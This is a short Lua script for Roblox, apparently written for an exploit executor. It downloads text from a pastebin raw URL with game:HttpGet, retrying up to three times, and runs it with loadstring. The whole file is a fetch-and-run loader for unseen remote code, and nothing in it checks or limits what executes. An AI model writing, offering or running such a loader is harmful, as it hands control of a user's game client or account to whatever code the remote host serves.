local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- CONFIGURATION
local EXTERNAL_SCRIPT_URL = "https://pastebin.com/raw/pfpzbXiF"
local MAX_RETRIES = 3
local RETRY_DELAY = 2

local function loadExternalScript()
    for attempt = 1, MAX_RETRIES do
        local success, response = pcall(function()
            return game:HttpGet(EXTERNAL_SCRIPT_URL, true)
        end)
        
        if success and response and #response > 50 then
            return response
        else
            warn("Attempt "..attempt.." failed")
            if attempt < MAX_RETRIES then
                task.wait(RETRY_DELAY)
            end
        end
    end
    error("Failed to load script after "..MAX_RETRIES.." attempts")
end

local function executeScript()
    local scriptContent = loadExternalScript()
    local fn, err = loadstring(scriptContent)
    if not fn then error(err) end
    return fn()
end

-- Main execution
local success, err = pcall(executeScript)
if not success then
    warn("Execution failed:", err)
end
